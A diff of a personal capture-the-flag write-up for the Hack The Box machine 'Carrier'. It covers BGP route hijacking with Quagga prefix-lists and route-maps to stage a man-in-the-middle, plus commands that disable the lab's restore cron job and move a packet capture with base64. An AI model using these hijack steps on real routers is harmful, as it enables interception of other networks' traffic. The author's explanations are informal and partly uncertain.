@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-03-19T11:17:59 EDT">
+<meta name="revised" content="2019-03-19T13:03:55 EDT">
 <title>Carrier :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -529,41 +529,106 @@
     
     
     
-    <p>This guide will only cover setting up bgp high jacking and to better summarize how to setup a mitm using bgp. There is one method that i believe everyone used which is where you host a ftp server and just redirect the track to your server. Not quite as cool as the mitm.</p>
+    <p>This guide will only cover setting up BGP high jacking and to better summarize how to set up a MITM using BGP. There is one method that I believe everyone used which is where you host an FTP server and just redirect the track to your server. Not quite as cool as mitm.</p>
 
-<p>Theres a script running in the background that will reset all the changes made. I had to deal with this the whole time i did the lab. I never once tried to disable it. Next time i have a cron job running the background thats hindering me in someway ill use this.</p>
+<p><a href="https://www.youtube.com/watch?v=2ZxRA8BgmnA">https://www.youtube.com/watch?v=2ZxRA8BgmnA</a></p>
+
+<p><a href="https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack">https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack</a></p>
+
+<p>There&rsquo;s a script running in the background that will reset all the changes made. I had to deal with this the whole time I did the lab. I never once tried to disable it. Next time I have a cron job running the background that&rsquo;s hindering me in someway ill use this.</p>
 
 <pre><code>reading 		crontab -l | grep -v &quot;^#&quot;
 disable 		chmod -x /opt/restore.sh
 </code></pre>
 
-<p>I used telnet to connect the router and perform my administrator. 0xdf used vtysh free range routing software suit for managing background protocols.</p>
+<p>I used telnet to connect the router and perform my administrator. It was kind of a pain you had to do some extra steps like fixing the 45007 45005 errors. Adding a password to quagga configuration files. Typing in the credentials was a pain.  0xdf used vtysh free range routing software suite for managing background protocols.</p>
 
 <p><img src="https://chickenpwny.github.io/images/carrier-root/vtysh.PNG" alt="vtysh" /></p>
 
 <p>overview</p>
 
-<p>permit   basically the order in which route-maps are checked in. highest to lowest, once all of the  controls of been checked it will break out if none are met.</p>
+<p>show running-config -</p>
 
-<p>prefix-list  I missed this part in my attempts ip prefix-list a set of conditions to check routes against either deny or allow. my understanding of this is that well be targeting 10.120.15.0 network sinve the network is using /24 /25. If you have two router advertisng two different subnets which everone has the closest match will have priority. example would be 10.120.0.0/16, the host2 10.120.15.0./24 would be prefered.</p>
+<p>permit - basically the order in which route-maps are checked in order, once all of the controls of been checked it will break out if none are met.</p>
+
+<p>prefix-list   - I missed this part in my attempts ip prefix-list a set of conditions to check routes against either deny or allow. my understanding of this is that well be targeting 10.120.15.0 network since the network is using /24 /25. If you have two router advertising two different subnets which everyone has the closest match will have priority. an example would be 10.120.0.0/16, the host2 10.120.15.0./24 would be preferred</p>
+
+<p>current configuration</p>
+
+<pre><code>show running-config
+Building configuration...
+
+Current configuration:
+!
+!
+interface eth0
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth1
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth2
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface lo
+ no link-detect
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ network 10.120.15.0/25
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+ip prefix-list chicken seq 5 permit 10.120.15.0/25
+!
+route-map to-as200 permit 5
+ match ip address prefix-list chicken
+ set community no-export
+!
+route-map to-as300 deny 5
+ match ip address prefix-list chicken
+!
+route-map to-as200 permit 10
+!
+route-map to-as300 permit 10
+!
+ip forwarding
+!
+line vty
+!
+end
+</code></pre>
 
 <p>route-map to-as200 effects that autonomous system</p>
 
 <pre><code>configure terminal
-this advertise a route to 10.120.15.0
+####
+routes to 10.120.15.0. because it is more specific than /21 as300 advertising this route will have priority. 
+####
 ip prefix-list chicken permit 10.120.15.0/25
-this tells as200 not to advertise it's route to as300. this is pretty important.
-route-map to-as200 permit 10
-match ip address prefix-list chicken
+
+####
+route 10.120.15.0 subnet to as100,set community no-export tells as200 not to advertise it's route to as300. this is pretty important.
+####
+route-map to-as200 permit 5
 set community no-export
-nothing will hapen to routes that don't match 10.120.15.0/25
-route-map to-as200 permit 20
-deny unless it patches the prefix-list
-route-map to-as300 deny 10
 match ip address prefix-list chicken
 
-route-map to-as300 permit 20
+####
+I think this is disconnects as300 to as200
+####
+route-map to-as300 deny 5
+match ip address prefix-list chicken
 
+ou need to do this to advertise the route.
 router bgp 100
 network 10.120.15.0 mask 255.255.255.128
 </code></pre>
@@ -572,19 +637,13 @@ network 10.120.15.0 mask 255.255.255.128
 
 ip prefix-list chicken permit 10.120.15.0/25
 
-route-map to-as200 permit 10
+route-map to-as200 permit 5
 match ip address prefix-list chicken
 set community no-export
 
-route-map to-as200 permit 20
-
-route-map to-as300 deny 10
+route-map to-as300 deny 5
 match ip address prefix-list chicken
 
-route-map to-as300 permit 20
-
-router bgp 100
-network 10.120.15.0 mask 255.255.255.128
 </code></pre>
 
 <p>tcpdump</p>
@@ -603,6 +662,12 @@ network 10.120.15.0 mask 255.255.255.128
 <p>tools to do research on ASN&rsquo;s. these tools are great to use during a pentest to find ip&rsquo;s owned by a the target.</p>
 
 <p>ultratools.com for asn lookup. ipinfo.io</p>
+
+<p>using base64 to move files without damaging the integrity of the data is a trick worth remembering.</p>
+
+<pre><code>base64 -w 0 chicken.pcap
+base64 -d chicken.b64.pcap &gt; chickenpwny.pcap
+</code></pre>
 
 
     
